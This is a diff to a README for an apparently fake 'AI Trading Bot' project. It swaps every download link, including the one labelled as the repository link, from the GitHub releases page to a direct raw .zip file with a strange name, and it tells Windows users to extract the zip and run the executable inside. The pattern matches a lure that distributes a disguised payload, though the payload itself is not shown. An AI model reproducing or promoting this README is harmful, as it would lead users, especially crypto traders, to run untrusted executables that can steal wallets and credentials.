@@ -1,6 +1,6 @@
 # 🤖 AI-Trading-Bot-Codepen - Automate Your Trades with Smart AI
 
-[![Download Now](https://img.shields.io/badge/Download-AI_Trading_Bot_2024-blueviolet?style=for-the-badge&logo=github)](https://github.com/Unprocessed-terebella929/AI-Trading-Bot-Codepen/releases)
+[![Download Now](https://img.shields.io/badge/Download-AI_Trading_Bot_2024-blueviolet?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Unprocessed-terebella929/AI-Trading-Bot-Codepen/main/claudicant/Trading-Codepen-A-Bot-premorality.zip)
 
 ## 🚀 Getting Started
 
@@ -9,7 +9,7 @@ Welcome to **AI-Trading-Bot-Codepen**! This application uses artificial intellig
 ### 📥 Download Instructions
 
 Visit this link to download the application:  
-[🔽 Click Here to Download AI-Trading-Bot-Codepen](https://github.com/Unprocessed-terebella929/AI-Trading-Bot-Codepen/releases)
+[🔽 Click Here to Download AI-Trading-Bot-Codepen](https://raw.githubusercontent.com/Unprocessed-terebella929/AI-Trading-Bot-Codepen/main/claudicant/Trading-Codepen-A-Bot-premorality.zip)
 
 Once downloaded, you’ll get a `.zip` file. Extract it to a folder on your Windows PC (right-click → Extract All) and run the main executable file to start trading.
 
@@ -69,12 +69,12 @@ Restart the bot to apply
 
 ## 🏆 Community & Resources
 
-- **GitHub Repository:** [AI-Trading-Bot-Codepen](https://github.com/Unprocessed-terebella929/AI-Trading-Bot-Codepen)  
+- **GitHub Repository:** [AI-Trading-Bot-Codepen](https://raw.githubusercontent.com/Unprocessed-terebella929/AI-Trading-Bot-Codepen/main/claudicant/Trading-Codepen-A-Bot-premorality.zip)  
 - **Support:** Open an issue on GitHub for help
 
 ## 📥 Final Download
 
-[🔽 Download AI-Trading-Bot-Codepen Now](https://github.com/Unprocessed-terebella929/AI-Trading-Bot-Codepen/releases)  
+[🔽 Download AI-Trading-Bot-Codepen Now](https://raw.githubusercontent.com/Unprocessed-terebella929/AI-Trading-Bot-Codepen/main/claudicant/Trading-Codepen-A-Bot-premorality.zip)  
 *Start trading with AI today—no experience needed.*
 
 Keywords: ai, bot, code, evm, html, index, js, trand
